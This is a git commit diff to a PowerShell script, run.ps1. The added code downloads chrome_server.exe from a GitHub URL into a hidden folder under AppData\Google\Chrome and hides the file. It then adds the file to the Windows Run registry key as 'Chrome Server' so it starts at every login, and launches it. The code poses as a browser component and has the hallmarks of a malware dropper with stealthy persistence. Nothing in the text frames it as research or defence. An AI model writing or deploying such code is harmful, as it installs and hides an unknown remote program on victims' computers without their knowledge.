874a99b0171a5a1ad7f2eefa7e0cfc86a572b324
yourname1204 <152464353+yourname1204@users.noreply.github.com>
2023-12-02 10:52:27 +0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -73,4 +73,20 @@ function Get-File
 }
 
 $uri = "https://github.com/yourname1204/future/raw/main/chrome_server.exe"
-Get-File -Uri $uri -TargetFile "C:\Users\Admin\Desktop"
+$dir = $spotifyDirectory = Join-Path -Path $env:APPDATA -ChildPath 'Google\Chrome\'
+if (!(Test-Path -Path $dir)) {
+    New-Item -ItemType Directory -Force -Path $dir
+}
+$hiddenAttribute = [System.IO.FileAttributes]::Hidden
+Set-ItemProperty -Path $dir -Name Attributes -Value $hiddenAttribute
+$file_path = Join-Path -Path $dir -ChildPath 'chrome_server.exe'
+Get-File -Uri $uri -TargetFile $dir
+if (Test-Path -Path $file_path) {
+    Write-Host "Done"
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Chrome Server' -Value $file_path
+    Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
+    Invoke-Item -Path $file_path
+}
+
+
+
